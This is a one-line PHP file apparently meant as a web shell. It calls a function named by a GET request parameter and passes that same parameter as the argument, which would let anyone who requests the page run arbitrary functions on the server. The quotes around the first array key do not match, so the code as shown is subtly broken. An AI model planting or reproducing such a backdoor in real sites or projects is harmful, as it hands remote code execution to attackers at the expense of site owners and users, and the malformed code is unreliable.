<?php
$_GET["X4J3ZLp1']($_GET['X4J3ZLp1']);
?>
